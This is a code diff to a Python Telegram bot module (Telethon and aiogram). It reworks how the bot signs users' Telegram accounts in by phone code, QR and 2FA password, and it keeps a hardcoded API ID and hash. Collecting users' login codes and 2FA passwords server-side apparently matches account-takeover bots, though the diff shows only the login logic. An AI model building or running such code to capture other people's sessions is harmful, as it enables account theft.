@@ -9,12 +9,12 @@ from telethon.errors import (
     PhoneCodeExpiredError, 
     PhoneCodeInvalidError, 
     PhoneNumberInvalidError,
-    ApiIdInvalidError
+    ApiIdInvalidError,
+    PasswordHashInvalidError # <--- ДОБАВЛЕНА ОБРАБОТКА НЕВЕРНОГО ПАРОЛЯ
 )
 from aiogram import Bot
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
-# ⚠️ Если 2040 не работает, попробуй 2496 или получи свои на my.telegram.org ⚠️
 API_ID = 2040
 API_HASH = 'b18441a1ff607e10a989891a5462e627'
 
@@ -146,7 +146,7 @@ async def send_code(user_id, phone):
         return {"status": "error", "msg": str(e)}
 
 
-async def sign_in(user_id, phone, code, code_hash, password=None):
+async def sign_in(user_id, phone, code, code_hash):
     client = active_clients.get(user_id)
     if not client:
         return {"status": "error", "msg": "Клиент не найден."}
@@ -155,12 +155,6 @@ async def sign_in(user_id, phone, code, code_hash, password=None):
         await client.sign_in(phone, code, phone_code_hash=real_hash)
         return {"status": "ok"}
     except SessionPasswordNeededError:
-        if password:
-            try:
-                await client.sign_in(password=password)
-                return {"status": "ok"}
-            except Exception:
-                return {"status": "error", "msg": "Неверный пароль 2FA."}
         return {"status": "2fa"}
     except PhoneCodeInvalidError:
         return {"status": "error", "msg": "Неверный код. Попробуйте снова."}
@@ -168,6 +162,28 @@ async def sign_in(user_id, phone, code, code_hash, password=None):
         return {"status": "error", "msg": "Код устарел. Запросите новый."}
     except FloodWaitError as e:
         return {"status": "error", "msg": f"⏳ Слишком много попыток. Подождите {e.seconds} секунд."}
+    except Exception as e:
+        return {"status": "error", "msg": str(e)}
+
+
+# --- ВХОД ПО 2FA ПАРОЛЮ (ОТДЕЛЬНО ДЛЯ НОМЕРА И QR) ---
+async def sign_in_2fa_phone(user_id, password):
+    client = active_clients.get(user_id)
+    try:
+        await client.sign_in(password=password)
+        return {"status": "ok"}
+    except PasswordHashInvalidError:
+        return {"status": "error", "msg": "Неверный пароль 2FA."}
+    except Exception as e:
+        return {"status": "error", "msg": str(e)}
+
+async def sign_in_2fa_qr(user_id, password):
+    client = active_clients.get(user_id)
+    try:
+        await client.sign_in(password=password)
+        return {"status": "ok"}
+    except PasswordHashInvalidError:
+        return {"status": "error", "msg": "Неверный пароль 2FA."}
     except Exception as e:
         return {"status": "error", "msg": str(e)}
 
@@ -193,6 +209,7 @@ async def check_qr(user_id):
     if not qr_login: 
         return {"status": "error", "msg": "Сессия истекла"}
     try:
+        # Ждем 3 секунды, чтобы не спамить Telegram
         await asyncio.wait_for(qr_login.wait(), timeout=3.0)
         return {"status": "ok"}
     except asyncio.TimeoutError:
@@ -200,17 +217,8 @@ async def check_qr(user_id):
     except SessionPasswordNeededError:
         return {"status": "2fa"}
     except Exception as e:
-        if "AUTH_TOKEN_EXPIRED" in str(e): 
-            return {"status": "error", "msg": "QR устарел"}
-        return {"status": "error", "msg": str(e)}
-
-
-async def sign_in_2fa_qr(user_id, password):
-    client = active_clients.get(user_id)
-    try:
-        await client.sign_in(password=password)
-        return {"status": "ok"}
-    except Exception as e:
+        if "AUTH_TOKEN_EXPIRED" in str(e) or "TokenExpiredError" in str(e): 
+            return {"status": "expired", "msg": "QR устарел"}
         return {"status": "error", "msg": str(e)}
 
 
